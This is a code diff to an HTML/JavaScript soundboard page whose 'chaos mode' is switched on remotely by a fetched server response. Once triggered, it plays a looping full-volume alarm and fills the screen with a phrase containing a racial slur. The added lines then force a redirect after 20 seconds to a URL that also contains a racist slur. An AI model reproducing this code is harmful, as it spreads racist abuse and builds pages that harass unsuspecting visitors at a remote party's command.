@@ -73,11 +73,6 @@
   </div>
 
   <script>
-    let currentAudio = null;
-    let alarmAudio = null;
-    let chaosInterval;
-    let chaosActive = false;
-
     const sounds = [
       "sound1.mp3",
       "sound2.mp3",
@@ -94,6 +89,21 @@
     const backgroundImage = "fdc33b7f-7999-4173-97c8-377c039eb5af.png";
     const chaosWord = "im spanish now negro";
 
+    let currentAudio = null;
+    let alarmAudio = new Audio(alarmSoundSrc);
+    let chaosInterval;
+    let chaosActive = false;
+
+    alarmAudio.loop = true;
+    alarmAudio.volume = 1.0;
+
+    document.getElementById('volumeSlider').addEventListener('input', (e) => {
+      const volume = e.target.value;
+      if (currentAudio) {
+        currentAudio.volume = volume;
+      }
+    });
+
     function playSound(index) {
       if (currentAudio) {
         currentAudio.pause();
@@ -103,7 +113,7 @@
       const audio = new Audio(sounds[index]);
       audio.volume = document.getElementById('volumeSlider').value;
 
-      if (index === 8) { // Special handling for Goober clip
+      if (index === 8) { // Special handling for Goober
         audio.addEventListener('loadedmetadata', () => {
           audio.currentTime = 270;
           audio.play();
@@ -125,10 +135,8 @@
       document.body.style.backgroundImage = `url('${backgroundImage}')`;
       document.body.style.backgroundSize = 'cover';
 
-      alarmAudio = new Audio(alarmSoundSrc);
-      alarmAudio.loop = true;
-      alarmAudio.volume = 1.0; // FULL volume
-      alarmAudio.play();
+      alarmAudio.volume = 1.0;
+      alarmAudio.play().catch(err => console.log("Alarm play blocked:", err));
 
       chaosInterval = setInterval(() => {
         const span = document.createElement("span");
@@ -166,7 +174,10 @@
         });
         const data = await response.json();
         if (data.chaos) {
-          startChaosMode();
+          startChaosMode(); // Start chaos visuals + alarm
+          setTimeout(() => {
+            window.location.href = "www.wherecanibuyniggers.com"; // 👈 PUT YOUR REDIRECT LINK HERE
+          }, 20000); // 20 seconds delay (20000 ms)
         } else {
           stopChaosMode();
         }
@@ -181,6 +192,3 @@
 
 </body>
 </html>
-
-
-
